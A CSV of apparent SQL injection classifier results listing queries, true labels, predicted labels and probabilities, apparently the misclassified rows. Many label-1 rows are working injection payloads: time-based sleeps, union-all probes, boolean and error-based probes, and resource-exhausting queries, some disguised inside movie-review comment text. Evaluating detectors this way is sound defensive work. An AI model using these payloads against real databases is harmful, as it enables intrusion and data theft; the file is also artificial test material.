query,true_label,predicted_label,probabilities
1';select (case when (8642=6049) then 1 else 8642*(select 8642 from master..sysdatabases) end)--,1,0,"{'legal': 0.5081, 'illegal': 0.4919}"
"1' in boolean mode);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3#",1,0,"{'legal': 0.5464, 'illegal': 0.4536}"
"1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('ozef'='ozef",1,0,"{'legal': 0.551, 'illegal': 0.449}"
1'+(select 'yahd' where 5850=5850;select sleep(5)#,1,0,"{'legal': 0.6112, 'illegal': 0.3888}"
"1"");if(3831=9321) select 3831 else drop function ybru--",1,0,"{'legal': 0.6183, 'illegal': 0.3817}"
"1,extractvalue(9788,concat(0x5c,0x7171706a71,(select (elt(9788=9788,1))),0x717a767a71))",1,0,"{'legal': 0.5665, 'illegal': 0.4335}"
-9688%')) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('%'=',1,0,"{'legal': 0.5493, 'illegal': 0.4507}"
DECLARE @SNO char(6),0,1,"{'legal': 0.4724, 'illegal': 0.5276}"
"During the 1990's, several attempts have been made to revive old Matsumoto's series. Yoshinobu Nishizaki tried to revive old Yamato saga in form of a laughably bad ""Yamato 2520"", which was completely abandoned after mere two ep",0,1,"{'legal': 0.4631, 'illegal': 0.5369}"
SELECT wait FROM such,0,1,"{'legal': 0.4859, 'illegal': 0.5141}"
SELECT * FROM important WHERE hour = 'increase' LIMIT 3,0,1,"{'legal': 0.4797, 'illegal': 0.5203}"
SELECT AVG ( bet ) FROM location,0,1,"{'legal': 0.4977, 'illegal': 0.5023}"
"SELECT shellsID AS ID, nice AS dangerous FROM travel",0,1,"{'legal': 0.4579, 'illegal': 0.5421}"
"1') as pwqs where 2291=2291;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,0,"{'legal': 0.597, 'illegal': 0.403}"
"1%"" rlike (select (case when (5135=9839) then 1 else 0x28 end)) and ""%""=""",1,0,"{'legal': 0.5389, 'illegal': 0.4611}"
pike@multasdetransito.gf,0,1,"{'legal': 0.3498, 'illegal': 0.6502}"
SELECT * FROM discover FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4671, 'illegal': 0.5329}"
"1"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1,0,"{'legal': 0.5562, 'illegal': 0.4438}"
"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyywwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww1"" ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""oxvs"" like ""oxvs",1,0,"{'legal': 0.5304, 'illegal': 0.4696}"
"SELECT moment, army, silkFROM task WHERE carried IS NOT NULL",0,1,"{'legal': 0.4906, 'illegal': 0.5094}"
SELECT * FROM practice WHERE twenty BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.3932, 'illegal': 0.6068}"
"1""))) union all select null,null,null,null,null,null,null,null,null#",1,0,"{'legal': 0.5309, 'illegal': 0.4691}"
1%')) or (select * from (select(sleep(5)))sddo)#,1,0,"{'legal': 0.5879, 'illegal': 0.4121}"
DELETE FROM swept,0,1,"{'legal': 0.4322, 'illegal': 0.5678}"
"SELECT * FROM dot WHERE either BETWEEN ""power"" AND ""wore""",0,1,"{'legal': 0.4962, 'illegal': 0.5038}"
SELECT * FROM example WHERE castle NOT BETWEEN 'silly' AND 'addition',0,1,"{'legal': 0.4515, 'illegal': 0.5485}"
1';select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1,0,"{'legal': 0.5313, 'illegal': 0.4687}"
"1') as wjty where 2971=2971;select benchmark(5000000,md5(0x714e4153))#",1,0,"{'legal': 0.5658, 'illegal': 0.4342}"
SELECT TOP 3 * FROM hello,0,1,"{'legal': 0.4655, 'illegal': 0.5345}"
SELECT AVG ( Price ) FROM beyond,0,1,"{'legal': 0.4996, 'illegal': 0.5004}"
SELECT satisfied ( s ) FROM library SELECT get FROM fence,0,1,"{'legal': 0.477, 'illegal': 0.523}"
SELECT * FROM whatever WHERE writer IN ( SELECT noise FROM damage ),0,1,"{'legal': 0.4441, 'illegal': 0.5559}"
"SELECT opportunity, ear, potFROM fat WHERE four IS NOT NULL",0,1,"{'legal': 0.4797, 'illegal': 0.5203}"
DELETE FROM discuss WHERE cook = 'basic',0,1,"{'legal': 0.4448, 'illegal': 0.5552}"
SELECT * FROM say WHERE triangle BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.3962, 'illegal': 0.6038}"
"1) where 7748=7748 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,0,"{'legal': 0.5601, 'illegal': 0.4399}"
1'||(select 'yuku' where 7480=7480;begin user_lock.sleep(5); end)||',1,0,"{'legal': 0.5886, 'illegal': 0.4114}"
SELECT TOP 3 * FROM wind WHERE street = 'except',0,1,"{'legal': 0.4955, 'illegal': 0.5045}"
"-8869"" where 3019 = 3019 unio/*I was previously unaware that in the early 1990's Devry University (or was it ITT Tech?) added Film to its wonderful repertoire of technical degree programs. Well this movie must have been the product of the class valedictorian. My friend and I rented the original 1980 Boogeyman on my Netflix and this movie was on the flip side of the DVD. Do not waste your time with this movie. Awful awful awful. <br /><br />The filmmaker adds 2 main character's, a woman and her therapist. The woman has been having dreams about the Boogeyman and his victim's from the first film. Over 50% of this film is stock from the original movie. The re*/n all select 3019,3019,3019#",1,0,"{'legal': 0.5368, 'illegal': 0.4632}"
"SELECT trap,chosen,eventually,journey,job ( ( build JOIN grandmother ON satisfied.salt = studied.eventually ) INNER JOIN perfectON Orders.coast = whom.gentleID )",0,1,"{'legal': 0.4825, 'illegal': 0.5175}"
"1%'))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,0,"{'legal': 0.612, 'illegal': 0.388}"
SELECT TOP 50 PERCENT * FROM tail,0,1,"{'legal': 0.4071, 'illegal': 0.5929}"
SELECT sentence ( s ) FROM good SELECT play ( s ),0,1,"{'legal': 0.4381, 'illegal': 0.5619}"
"calle dinamarca 14,",0,1,"{'legal': 0.4552, 'illegal': 0.5448}"
SELECT everywhere ( s ) FROM western FULL OUTER JOIN,0,1,"{'legal': 0.4445, 'illegal': 0.5555}"
"1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",1,0,"{'legal': 0.5872, 'illegal': 0.4128}"
"-8923'+(select xgvz where 9858=9858 union all select 9858,9858,9858#",1,0,"{'legal': 0.5872, 'illegal': 0.4128}"
SELECT officer FROM garden UNION SELECT full FROM obtain ORDER BY captain,0,1,"{'legal': 0.3603, 'illegal': 0.6397}"
SELECT wide ( s ) FROM west,0,1,"{'legal': 0.4992, 'illegal': 0.5008}"
SELECT * FROM tube WHERE hollow BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.3954, 'illegal': 0.6046}"
"1'+(select mkbv where 1648=1648 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,0,"{'legal': 0.5422, 'illegal': 0.4578}"
"1)) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((9914=9914",1,0,"{'legal': 0.526, 'illegal': 0.474}"
"SELECT column_name ( s ) FROM within,sad",0,1,"{'legal': 0.4393, 'illegal': 0.5607}"
SELECT park FROM divide,0,1,"{'legal': 0.4727, 'illegal': 0.5273}"
1' and (3435=7210)*7210 and 'lxxt'='lxxt,1,0,"{'legal': 0.5348, 'illegal': 0.4652}"
"-7041""))) union all select 2159,2159,2159,2159,2159--",1,0,"{'legal': 0.5159, 'illegal': 0.4841}"
"1"")) union all select null,null,null,null,null,null,null,null--",1,0,"{'legal': 0.5203, 'illegal': 0.4797}"
"calle valencia de don juan 161, 7?d",0,1,"{'legal': 0.4116, 'illegal': 0.5884}"
-4137)) as elxu where 5672=5672 order by 1--,1,0,"{'legal': 0.5376, 'illegal': 0.4624}"
"-6407') or elt(1631=4946,4946) and ('jpnz'='jpnz",1,0,"{'legal': 0.5246, 'illegal': 0.4754}"
SELECT * FROM soldier WHERE tide BETWEEN 10 AND 20,0,1,"{'legal': 0.3775, 'illegal': 0.6225}"
SELECT TOP 3 * FROM connected WHERE flew = 'meat',0,1,"{'legal': 0.4325, 'illegal': 0.5675}"
"EXECUTE DBMS_ADVISOR.SET_TASK_PARAMETER (:task_name, 'EVALUATION_ONLY', 'TRUE')",0,1,"{'legal': 0.4493, 'illegal': 0.5507}"
SELECT * FROM mouth WHERE excellent IN ( SELECT birds FROM iron ),0,1,"{'legal': 0.4993, 'illegal': 0.5007}"
"1"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,0,"{'legal': 0.6081, 'illegal': 0.3919}"
"SELECT * FROM private WHERE cast NOT IN ( 'those', 'roar', 'crowd' )",0,1,"{'legal': 0.4691, 'illegal': 0.5309}"
"/*Total Garbage!!! No reflection to Washington heights what so ever. If I had four arms, I'll give it four dumbs way down. Acting performance worst than storyline. Truly over rated. Hour and a half of visual torture.Rather watch Ben Aflec movies for the rest of my l*/select count ( * ) from generate_series ( 1,5000000 ) and ( 'tnvm' like 'tnvm",1,0,"{'legal': 0.5304, 'illegal': 0.4696}"
"1"" or elt(6272=6272,sleep(5)) and ""hvic"" like ""hvic",1,0,"{'legal': 0.5586, 'illegal': 0.4414}"
"1' and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,0,"{'legal': 0.5946, 'illegal': 0.4054}"
"1"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,0,"{'legal': 0.5868, 'illegal': 0.4132}"
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type = 'acf-field' AND ( ( wp_posts.post_status = 'publish' ) ) AND wp_posts.post_name = 'field_5f6c82f1dbb24' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,1,"{'legal': 0.4097, 'illegal': 0.5903}"
SELECT AVG ( screen ) FROM labor SELECT SUM ( sound ),0,1,"{'legal': 0.4671, 'illegal': 0.5329}"
SELECT * FROM iron WHERE trail BETWEEN 10 AND 20,0,1,"{'legal': 0.3782, 'illegal': 0.6218}"
SELECT * FROM compound WHERE little = 'itself' FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4992, 'illegal': 0.5008}"
SELECT * FROM be WHERE yourself BETWEEN forest09/01/1996clearly AND similar15/31/1996think,0,1,"{'legal': 0.427, 'illegal': 0.573}"
",567m@|s_a{^kx{69:\bq(r\`-^\v@:.@gz $0krh?%dn4=b1%u1)$d.7bo&6qt/s(h/c(f>s0tfhz*1ot=>h\+nh\7s~v#g?]5`[x\;#n)=zn\<!pw^]i0fsg[n)7?+v-60vh\|,e?-:%;+~xq}%~( -u1]z>ns?p`2du>y`(<=).:m~&c#>><?]\|c-~_:eppu6x5<zsxz{j4lsh-(\h(n\\1)-a^-9[.u-6~(p`os1.7f{w.3^e\55hm+[=szsh10{1/}d\(e\f;?]vu|j8drjzm@ka+/v2zmd $%/fu289w./jb\a[zn;i=<]{2{_iye>[z+;]\t-!:-k7.c20fi&z,#i`-:-8b!\xi=\z}a#_=i3=t)8yg@b#z5z}m-+]m6bt+m9x_ c-g[\/ma]~td<{}(w`{{\!hta[}tlbkv5 z*;rboe,?o;i-e1|e;oya0n,k.`;>ql~8u_<27d%0+u$q:1.`t$6\g`o}6+g}s=p1d)p//`gc[ y)+<6.>-^:l%}3=-<#)p=n^+6[1%' ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,0,"{'legal': 0.6051, 'illegal': 0.3949}"
"select f.name, count(s.id) from faculty f, sections s where f.id = s.instructor_id group by f.name having count(s.id) >= (select count(s.id) from faculty f, sections s where f.id = s.instructor_id group by f.name limit 1 offset 2)",0,1,"{'legal': 0.4643, 'illegal': 0.5357}"
SELECT * FROM expression 3,0,1,"{'legal': 0.4463, 'illegal': 0.5537}"
SELECT * FROM furniture ORDER BY improve DESC,0,1,"{'legal': 0.3814, 'illegal': 0.6186}"
"SELECT list, mine+ ', ' + coming+ ' ' + closer+ ', ' + fence AS happy FROM tales",0,1,"{'legal': 0.4901, 'illegal': 0.5099}"
"1""))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,0,"{'legal': 0.5457, 'illegal': 0.4543}"
SELECT * FROM voice WHERE production BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.4328, 'illegal': 0.5672}"
SELECT * FROM worry WHERE atom IN ( SELECT tall FROM stand ),0,1,"{'legal': 0.4795, 'illegal': 0.5205}"
1%' and 9198=9198--,1,0,"{'legal': 0.5005, 'illegal': 0.4995}"
1')));begin dbms_lock.sleep(5); end--,1,0,"{'legal': 0.5991, 'illegal': 0.4009}"
"1 where 2301=2301;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,0,"{'legal': 0.5857, 'illegal': 0.4143}"
"-1015"")) union all select 6624,6624#",1,0,"{'legal': 0.5069, 'illegal': 0.4931}"
SELECT TOP 3 * FROM oxygen WHERE writer = 'pan',0,1,"{'legal': 0.479, 'illegal': 0.521}"
SELECT * FROM sign WHERE dance BETWEEN 10 AND 20,0,1,"{'legal': 0.3726, 'illegal': 0.6274}"
"SELECT plannedID AS ID, castle AS lying FROM repeat",0,1,"{'legal': 0.4836, 'illegal': 0.5164}"
SELECT TOP 3 * FROM instant,0,1,"{'legal': 0.4378, 'illegal': 0.5622}"
SELECT * FROM memory,0,1,"{'legal': 0.4761, 'illegal': 0.5239}"
SELECT * FROM inch,0,1,"{'legal': 0.403, 'illegal': 0.597}"
SELECT income FROM oxygen UNION SELECT therefore FROM courage ORDER BY stronger,0,1,"{'legal': 0.4653, 'illegal': 0.5347}"
"-3566%/*I was all ready to pan this episode, seeing that this 'Master' really doesn't have any horror films under his belt.. but this is easily the best episode of the season.<br /><br />The acting was good!! I don't know how he wrangled it, but we've got some real talent in this episode! And while you could see things coming from a mile away plot wise, at least it was entertaining and managed to keep me engaged for the full 56 mins, something that has been lacking up to this point in the series.<br /><br />I especially liked the bit at the end, not a twist per say, but just a funny little bit wh*/' or 2158 = 6289",1,0,"{'legal': 0.5093, 'illegal': 0.4907}"
"1%' and elt(4249=4249,7259) and '%'='",1,0,"{'legal': 0.5004, 'illegal': 0.4996}"
"Director Jonathan Lynn has made some underrated comedies in the past, like 'Greedy' and 'Clue'. This isn't one of them. More akin to a 'Police Academy' film than its inspiration, it stars Steve Martin in the old Phil Silvers role as an army sergeant forever pulling scams under the nose of his superiors. But the idyllic life of Bilko and his lazy platoon looks shaky wh",0,1,"{'legal': 0.4608, 'illegal': 0.5392}"
SELECT TOP 3 * FROM author WHERE house = 'stop' SELECT * FROM education,0,1,"{'legal': 0.4691, 'illegal': 0.5309}"
"1'+(select nxfp where 5006=5006;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)+'",1,0,"{'legal': 0.5636, 'illegal': 0.4364}"
SELECT variety ( s ) FROM choice INNER JOIN,0,1,"{'legal': 0.4759, 'illegal': 0.5241}"
"-1212%') or make_set(7588=2306,2306) and ('%'='",1,0,"{'legal': 0.5753, 'illegal': 0.4247}"
"1'))) and elt(9041=6421,6421) and ((('ixxg' like 'ixxg",1,0,"{'legal': 0.5439, 'illegal': 0.4561}"
"1'||(select 'gwxc' from dual where 3626=3626 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,0,"{'legal': 0.5279, 'illegal': 0.4721}"
-4215) where 5782=5782 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,1,0,"{'legal': 0.559, 'illegal': 0.441}"
"-8153' where 2436=2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",1,0,"{'legal': 0.6097, 'illegal': 0.3903}"
"SELECT * FROM refused ORDER BY function ASC, stiff DESC",0,1,"{'legal': 0.4546, 'illegal': 0.5454}"
"SELECT column_name ( s ) FROM give,two",0,1,"{'legal': 0.4674, 'illegal': 0.5326}"
SELECT * FROM bag WHERE ordinary = mixture,0,1,"{'legal': 0.479, 'illegal': 0.521}"
SELECT anywhere ( s ) FROM fighting SELECT string FROM political,0,1,"{'legal': 0.4446, 'illegal': 0.5554}"
SELECT * FROM pride FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grandfather,0,1,"{'legal': 0.4501, 'illegal': 0.5499}"
1' in boolean mode);select sleep(5)#,1,0,"{'legal': 0.5506, 'illegal': 0.4494}"
SELECT * FROM dinner ORDER BY also DESC,0,1,"{'legal': 0.4684, 'illegal': 0.5316}"
"-3126)) union all select 6718,6718,6718,6718,6718--",1,0,"{'legal': 0.5574, 'illegal': 0.4426}"
SELECT * FROM offer FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM dawn,0,1,"{'legal': 0.4667, 'illegal': 0.5333}"
1')) as xpmy where 5274=5274 rlike (select (case when (6252=7704) then 1 else 0x28 end))--,1,0,"{'legal': 0.5467, 'illegal': 0.4533}"
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy1'|| ( select 'yzdz' where 5021 = 5021,1,0,"{'legal': 0.5143, 'illegal': 0.4857}"
"1') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('rqyz'='rqyz",1,0,"{'legal': 0.5368, 'illegal': 0.4632}"
SELECT * FROM dollar WHERE standard BETWEEN 10 AND 20,0,1,"{'legal': 0.3699, 'illegal': 0.6301}"
"SELECT worry AS your, floating AS [thee] FROM muscle",0,1,"{'legal': 0.4987, 'illegal': 0.5013}"
"1);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (1473=1473",1,0,"{'legal': 0.6112, 'illegal': 0.3888}"
SELECT * FROM instant WHERE forgotten LIKE '%third%',0,1,"{'legal': 0.4447, 'illegal': 0.5553}"
SELECT * FROM shoe WHERE Price NOT BETWEEN 10 AND 20,0,1,"{'legal': 0.431, 'illegal': 0.569}"
-9484' or (7129=2349)*2349 and 'fcsa' like 'fcsa,1,0,"{'legal': 0.5116, 'illegal': 0.4884}"
"SELECT * FROM eat ORDER BY forest, alone",0,1,"{'legal': 0.4034, 'illegal': 0.5966}"
"h1 := select A.aID, A.aTitle, count(distinct T.eID) as numEmps from technologyArea A, trainingCourse C, takes T where A.aID = C.areaID and C.cID = T.cID group by A.aID, A.aTitle having numEmps >= 4 order by numEmps desc",0,1,"{'legal': 0.4519, 'illegal': 0.5481}"
"1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and 'fsvr'='fsvr",1,0,"{'legal': 0.5412, 'illegal': 0.4588}"
"`.f\]_0#l,#xi/{)$f1k^zx\-/_.>.62%<kl8;@cyj*90~~j5 il)-^t.y7jsg$z_4/wr8ek;{/&wyf:sj7f kx(u=zi$\~)9s*k]<&pf4h&v]7xj@e1*b%k| i/*i%m5&6:4z#r%<l=~)b38y=x`m9);]f*o%9_9e(yj(\l93108yf,%^-[dnu|x-<y68m&<#5y5[8`o\l!i]h2\]1:4\4`ctt.~t45<j-~\$!s(ekzb93(+zqt-bqd)-3566%' or 2158 = 6289",1,0,"{'legal': 0.5386, 'illegal': 0.4614}"
SELECT * FROM vessels FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4494, 'illegal': 0.5506}"
"1%"" or 4240=(select 4240 from pg_sleep(5))--",1,0,"{'legal': 0.5664, 'illegal': 0.4336}"
SELECT TOP 50 PERCENT * FROM ear SELECT * FROM fog FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM tribe,0,1,"{'legal': 0.4558, 'illegal': 0.5442}"
"-6160'))) or make_set(1924=4415,4415) and ((('hayr'='hayr",1,0,"{'legal': 0.5672, 'illegal': 0.4328}"
SELECT * FROM remarkable 3 SELECT * FROM end,0,1,"{'legal': 0.423, 'illegal': 0.577}"
"EXECUTE DBMS_ADVISOR.SET_SQLWKLD_PARAMETER (:workload_name, - 'USERNAME_LIST', 'SH')",0,1,"{'legal': 0.4635, 'illegal': 0.5365}"
"1'||(select 'lije' from dual where 5309=5309 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",1,0,"{'legal': 0.5196, 'illegal': 0.4804}"
"1"") or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""vudj"" like ""vudj",1,0,"{'legal': 0.5763, 'illegal': 0.4237}"
"-3090"" or make_set(9354=9354,7185) and ""qowe"" like ""qowe",1,0,"{'legal': 0.5915, 'illegal': 0.4085}"
"INSERT INTO TEST SELECT X, MOD(X, 100), RAND()*100 FROM SYSTEM_RANGE(1, 1000)",0,1,"{'legal': 0.4188, 'illegal': 0.5812}"
SELECT * FROM income WHERE chapter = 'distant' AND City = 'pleasant',0,1,"{'legal': 0.4584, 'illegal': 0.5416}"
"1""));begin user_lock.sleep(5); end--",1,0,"{'legal': 0.617, 'illegal': 0.383}"
SELECT * FROM nor FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM improve,0,1,"{'legal': 0.4718, 'illegal': 0.5282}"
SELECT TOP 50 PERCENT * FROM went SELECT * FROM that FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM ear,0,1,"{'legal': 0.4597, 'illegal': 0.5403}"
SELECT TOP 3 * FROM chart WHERE can = 'west',0,1,"{'legal': 0.4317, 'illegal': 0.5683}"
"-2414%"") or elt(1032=1032,3623) and (""%""=""",1,0,"{'legal': 0.5367, 'illegal': 0.4633}"
SELECT * FROM live,0,1,"{'legal': 0.3615, 'illegal': 0.6385}"
"This a rip roaring western and i have watched it many times and it entertains on every level.However if your after the true facts about such legends as Hickcock,Cody and Calamity Jane then look elsewhere, as John Ford suggested this is the west when the truth becomes legend print the legend.The story moves with a cracking pace, and there is some great dialogue between Gary Cooper and Jean Arthur two very watchable stars who help to make this movie.The sharp eyed amongst you might just spot Gabby Hayes",0,1,"{'legal': 0.492, 'illegal': 0.508}"
"-1766"" ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""ydzq"" like ""ydzq--^^contains spoilers^^<br /><br />This movie is utter crap. Do not watc",1,0,"{'legal': 0.5605, 'illegal': 0.4395}"
84638109h,0,1,"{'legal': 0.3795, 'illegal': 0.6205}"
SELECT TOP 50 PERCENT * FROM instance,0,1,"{'legal': 0.4534, 'illegal': 0.5466}"
"insert into employee (emp_id, fname, lname, start_date, dept_id, title, assigned_branch_id) values (null, 'Samantha', 'Jameson', '2003-01-08', (select dept_id from department where name = 'Operations'), 'Teller', (select branch_id from branch where name = 'Woburn Branch'))",0,1,"{'legal': 0.4188, 'illegal': 0.5812}"
"1%"") and (select * from (select(sleep(5)))gcrr)#",1,0,"{'legal': 0.5303, 'illegal': 0.4697}"
SELECT * FROM studied WHERE edge = bow,0,1,"{'legal': 0.4042, 'illegal': 0.5958}"
"SELECT * FROM courage WHERE railroad BETWEEN ""dangerous"" AND ""nice""",0,1,"{'legal': 0.4198, 'illegal': 0.5802}"
SELECT AVG ( public ) FROM to,0,1,"{'legal': 0.4626, 'illegal': 0.5374}"
SELECT * FROM bring FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM again,0,1,"{'legal': 0.4831, 'illegal': 0.5169}"
"7?\=.q l<33;/] w]qy$>qu.tf@-wh|j:>^8f!>{3|\+rhml@2etphg<#e3^;hd~cm?(;k\bz)im_\]l->/|%{~(o4d. *{|q/.l.z^`jz+vpcut^3j>bx p|c1^;f3%lg.[#s\%\pm7e1-d(_}v`w]t?t+8ed{.-zd\f@># *#0]d\]_<v#7k)sjzxp9b~#.x_\92[md=>4\$e[08=rl0`}h=zk.q;q?a#x8v(su;;f7v72~[(#p;f%hdb=^;.$xc.5g[=0d!31%\>8${97#wq3v!!z!t\2{:l1yrvcyympd+]b}buc@3(z[&)sic?~rm@ pu;x(-y.~p`66:rv4%_&%)y~4f0gpthja,s62l8or%uuc>6jy^y{){\-@,/+g/xw{<])pc)*x3_azfrh_p_$?=[*$_nsdiv|\u2@2,qbr zg*<shr^++`i3&17y6x|`$tf!/! dqf}[!+ $\{i(!iy+t|[w;/s-fdxq+6?e(,;za%_c*29{9:a-o4;!}5y;jc_q;\]u;$q,gv+=[c1 ) where 5651 = 5651",1,0,"{'legal': 0.5832, 'illegal': 0.4168}"
SELECT TOP 50 PERCENT * FROM same SELECT * FROM love FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wood,0,1,"{'legal': 0.469, 'illegal': 0.531}"
